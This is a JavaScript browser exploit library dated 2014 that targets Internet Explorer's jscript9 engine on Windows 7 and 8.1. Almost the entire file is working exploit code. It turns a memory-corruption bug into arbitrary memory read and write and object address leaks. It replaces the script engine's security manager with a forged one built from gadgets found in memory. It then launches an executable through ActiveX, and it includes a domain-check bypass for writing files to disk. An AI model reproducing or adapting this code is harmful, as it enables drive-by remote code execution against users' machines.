/*
 * Author: Chen Zhang (@demi6od) <demi6d@gmail.com>
 * Date: 2014 May 23rd
 * 
 * Reference: explib2 (@古河120)
 */

/*  
                           ------------------------
                           |  LargeHeapBlockEntry |
                           ------------------------
                           |  ArrayDataHead       |
                           ------------------------
  arrAddr or varArrAddr -> |  TypedArray pointer  |
                           |  TypedArray pointer  |
                           |  TypedArray pointer  |
                           |  ...                 |
                           |  (number << 1) | 1   |
                           |  (number << 1) | 1   |
                           |  (number << 1) | 1   |
                           |  ...                 |
                           ------------------------
                           |  TypedArray          |
                           |                      |
                           |                      |
                           ------------------------
                           |  TypedArray          |
                           |                      |
                           |                      |
                           ------------------------
                           |  TypedArray          |
                           |                      |
                           |                      |
                           ------------------------
                           |  ...                 |
                           ------------------------

   arrs [in]: Array of intArr or varArr, one int or var arr's capacity will be modified through vulnerability.
   varArrs [in]: Array of varArr, all varArr contain typed array.

   description: 
   1. Use vulnerability to modify the capacity of one intArr or varArr
   2. Use modified array to out-of-bound write the length of one typedArr. (length: 0 -> 0xffffffff, address: 0)
   3. Use modified typedArr to write some special value at arrAddr, and iterate the arrs to find it.
      Put any object on that place and read arrAddr will leak that object's address.
*/ 

// Namespace
var tExpLib = {};

tExpLib.initialize = function(arrs, arrAddr, varArrs, varArrAddr) {
    tExpLib.arrs = arrs;
    tExpLib.arrAddr = arrAddr;

    // The first item of leakArr is used to leak object address
    tExpLib.leakArr = [];
    tExpLib.leakArrAddr = arrAddr;

    tExpLib.varArrs = varArrs;
    tExpLib.varArrAddr = varArrAddr;
    // This typedArr in varArrs is use for arbitrary address read and write
    tExpLib.typedArr = [];

    tExpLib.varArrLen = 0x3bf8;
    tExpLib.typedArrNum = 0x55;

    if (navigator.appVersion.indexOf('Windows NT 6.1') != -1) {
        console.log('[+] Exploit platform is Windows 7');
        tExpLib.secManagerOff = 0x220;
    } else if (navigator.appVersion.indexOf('Windows NT 6.3') != -1) {
        console.log('[+] Exploit platform is Windows 8.1');
        tExpLib.secManagerOff = 0x21c;
    } else {
        console.log('[-] Error: Not supported windows version: ' + navigator.appVersion);
    }

    getExpArr();
};

function getExpArr() {
    // Write typedArr length to 0xffffffff
    var typedArrLenOffset = 0x18;
    for (var i = 0; i < tExpLib.arrs.length; i++) {
        tExpLib.arrs[i][(tExpLib.varArrAddr + (tExpLib.varArrLen * 4) + typedArrLenOffset - tExpLib.arrAddr) / 4] = -1;
    }

    // Find modified typedArr
    var isFound = false;
    for (var i = 0; i < tExpLib.varArrs.length; i++) {
        for (var j = 0; j < tExpLib.typedArrNum; j++) {
            if (typeof tExpLib.varArrs[i][j] == 'object' && tExpLib.varArrs[i][j].length == 0xffffffff) {
                tExpLib.typedArr = tExpLib.varArrs[i][j];
                console.log('[+] Find typedArr with length: ' + tExpLib.typedArr.length.toString(16));
                isFound = true;
                break;
            }
        }
    }

    if (!isFound) {
        console.log('[-] Error: Failed to get exp typed array!');
    }
    // Write leakArr first item
    writeDWord(tExpLib.leakArrAddr, 0x0eadbeef);

    // Find leakArr
    for (var i = 0; i < tExpLib.arrs.length; i++) {
        if (tExpLib.arrs[i][0] == (0x0eadbeef >> 1)) {
            tExpLib.leakArr = tExpLib.arrs[i];
            console.log('[+] Find leakArr with first item: ' + (tExpLib.leakArr[0] << 1).toString(16));
            break;
        }
    }
}

function readDWord(addr) {
    var align = addr % 4;

    var dwordLow = tExpLib.typedArr[(addr - align) / 4];
    var dwordHigh = tExpLib.typedArr[(addr - align + 4) / 4];

    if (align == 0) {
        var dword = dwordLow >>> (align * 8); 
    } else {
        var dword = (dwordHigh << (32 - align * 8)) | ((dwordLow >>> (align * 8)) >> 0); 
    }
    // Convert to unsinged int
    return dword >>> 0;
}

function readByte(addr) {
    return (readDWord(addr) & 0xff);
}

function writeDWord(addr, value) {
    var align = addr % 4;

    var dwordLow = tExpLib.typedArr[(addr - align) / 4];
    valueLow = (value << (align * 8)) | (dwordLow & ((1 << (align * 8)) - 1));
    tExpLib.typedArr[(addr - align)/4] = valueLow;

    if (align != 0) {
        var dwordHigh = tExpLib.typedArr[(addr - align + 4) / 4];
        valueHigh = ((value >>> (32 - align * 8)) >> 0) | (dwordHigh & (0xffffffff << (align * 8)));
        tExpLib.typedArr[(addr - align + 4)/4] = valueHigh;
    }
}

function writeByte(addr, value) {
    var oriDWord = readDWord(addr);
    writeDWord(addr, (oriDWord & 0xffffff00) | (value & 0xff));
}

function writeBytes(addr, bytes) {
    for (var i = 0; i < bytes.length; i++) {
        writeByte(addr + i, bytes[i]);
    }
}

function writeStringW(addr, str) {
    var bytes = [];
    for (var i = 0 ; i < str.length; i++) {
        bytes[i * 2] = str.charCodeAt(i);
        bytes[i * 2 + 1] = 0;
    }

    bytes[str.length * 2] = 0;
    bytes[str.length * 2 + 1] = 0;

    writeBytes(addr, bytes);
}

function memcpy(dst, src, size) {
    for (var i = 0; i < size; i += 4) {
        var dword = readDWord(src + i); 
        writeDWord(dst + i, dword);
    }
}

function getModuleBase(curAddr) {
    while (curAddr > 0) {
        var lowWord = readDWord(curAddr) & 0xffff;
        if (lowWord == 0x5a4d) {
            return curAddr;
        } else {
            curAddr -= 0x10000;
        }
    }

    return -1;
}

function search(pat, start, end) {
    if (start + pat.length > end) {
        return -1;
    }

    for (var pos = start; pos < end; pos++) {
        var isFound = true;
        for (var i = 0; i < pat.length; i++) {
            if (readByte(pos + i) != pat[i]) {
                isFound = false;
                break;
            }
        }
        if (isFound) {
            return pos;
        }
    }
            
    return -1;
}

function leakAddr(obj) {
    tExpLib.leakArr[0] = obj;
    return readDWord(tExpLib.leakArrAddr);
}

tExpLib.exploit = function() {
    var funcAddr = leakAddr(ActiveXObject);
    var scriptEngineAddr = readDWord(readDWord(funcAddr + 0x1c) + 4);
    console.log('[+] Script engine address: ' + scriptEngineAddr.toString(16));

    var oriSecManager = readDWord(scriptEngineAddr + tExpLib.secManagerOff);
    if (!oriSecManager) {
        // Let security manager to be valid
        try {
            var WshShell = new ActiveXObject("WScript.shell");
        } catch (e) {}

        oriSecManager = readDWord(scriptEngineAddr + tExpLib.secManagerOff);
    }
    console.log('[+] Original security manager address: ' + oriSecManager.toString(16));

    var oriSecManagerVTbl = readDWord(oriSecManager); 
    var secManagerSize = 0x28;
    var fakeSecManager = tExpLib.arrAddr + 0x40000;
    var fakeSecManagerVTbl = fakeSecManager + secManagerSize;

    memcpy(fakeSecManager, oriSecManager, secManagerSize);
    memcpy(fakeSecManagerVTbl, oriSecManagerVTbl, 0x70);
    console.log('[+] Fake security manager address: ' + fakeSecManager.toString(16));

    writeDWord(fakeSecManager, fakeSecManagerVTbl);
    writeDWord(scriptEngineAddr + tExpLib.secManagerOff, fakeSecManager);

    jscript9Base = getModuleBase(readDWord(scriptEngineAddr) & 0xffff0000);
    jscript9Start = jscript9Base + readDWord(jscript9Base + readDWord(jscript9Base + 0x3c) + 0x104);
    jscript9End = jscript9Base + readDWord(jscript9Base + readDWord(jscript9Base + 0x3c) + 0x108);

    // mov esp, ebp; pop ebp; ret 8;
    var fakeVFunc1 = search([0x8b, 0xe5, 0x5d, 0xc2, 0x08], jscript9Start, jscript9End);
    console.log('[+] Find Fake virtual function 1: ' + fakeVFunc1.toString(16));
    writeDWord(fakeSecManagerVTbl + 0x14, fakeVFunc1);

    // mov esp, ebp; pop ebp; ret 4;
    var fakeVFunc2 = search([0x8b, 0xe5, 0x5d, 0xc2, 0x04], jscript9Start, jscript9End);
    console.log('[+] Find Fake virtual function 2: ' + fakeVFunc2.toString(16));
    writeDWord(fakeSecManagerVTbl + 0x10, fakeVFunc2);

    execPE(pe_calc);
};

function execCalc() {
    var WshShell = new ActiveXObject("WScript.shell");
    var oExec = WshShell.Exec("calc");
}

function execPE(peData) {
    var WshShell = new ActiveXObject("WScript.shell");
    var temp = WshShell.ExpandEnvironmentStrings("%TEMP%");
    var fileName = temp + "\\calc.exe";
    var srcFile = "c:\\windows\\system32\\calc.exe";

    var bStream = new ActiveXObject("ADODB.Stream");
    var txtStream = new ActiveXObject("ADODB.Stream");
    bStream.Type = 1;
    txtStream.Type = 2;

    bStream.Open();
    txtStream.Open();

    txtStream.WriteText(peData);
    txtStream.Position = 2;
    txtStream.CopyTo( bStream );
    txtStream.Close();

    copyFile(srcFile, fileName);
    //saveToFile(bStream, fileName);

    bStream.Close();
    
    oExec = WshShell.Exec(fileName);
}

function copyFile(srcFile, fileName) {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    fso.CopyFile(srcFile, fileName);
}

function saveToFile(stream, fileName) {
    var hostDispatch = leakAddr(stream);
    console.log('[+] hostDispatch address: ' + hostDispatch.toString(16));

    var cStream = readDWord(hostDispatch + 0x30);
    console.log('[+] cStream address: ' + cStream.toString(16));

    var urlAddr = readDWord(cStream + 0x44);
    console.log('[+] Url address: ' + urlAddr.toString(16));

    // Bypass domain check
    writeStringW(urlAddr, 'file:///C:/1.htm')
    console.log('[+] Write file protocol url at address: ' + urlAddr.toString(16));

    stream.SaveToFile(fileName, 2);
    console.log('[+] Save PE to windows temp dir');
}

tExpLib.expTestCase = function() {
    var obj = {a: 1, b: 2};
    var objAddr = leakAddr(obj);
    console.log('[+] Leak address: ' + objAddr.toString(16));

    var addr = tExpLib.arrAddr + 0x60;
    console.log('[+] addr: ' + addr.toString(16));

    writeDWord(addr, 0xdeadc0de);
    writeDWord(addr + 0x10 + 1, 0xdeadc0de);
    writeDWord(addr + 0x20 + 2, 0xdeadc0de);
    writeDWord(addr + 0x30 + 3, 0xdeadc0de);
    writeDWord(addr + 0x4, 0xdeadc0de);
    writeByte(addr + 0x8, 0x41);
    writeByte(addr + 0xd, 0x41);

    console.log('[+] Read dword at ' + addr.toString(16) + ': ' + readDWord(addr).toString(16));
    console.log('[+] Read dword at ' + (addr + 0x10 + 1).toString(16) + ': ' + readDWord(addr + 0x10 + 1).toString(16));
    console.log('[+] Read dword at ' + (addr + 0x20 + 2).toString(16) + ': ' + readDWord(addr + 0x20 + 2).toString(16));
    console.log('[+] Read dword at ' + (addr + 0x30 + 3).toString(16) + ': ' + readDWord(addr + 0x30 + 3).toString(16));
    console.log('[+] Read byte at ' + (addr + 8).toString(16) + ': ' + readByte(addr + 8).toString(16));

    memcpy(addr + 0x40, addr + 0xf028, 0x100); 

    var pat = [0xde, 0xc0, 0xad, 0xde]; 
    var pos = search(pat, addr, addr + 0xffff);
    console.log('[+] Pat pos: ' + pos.toString(16));
};
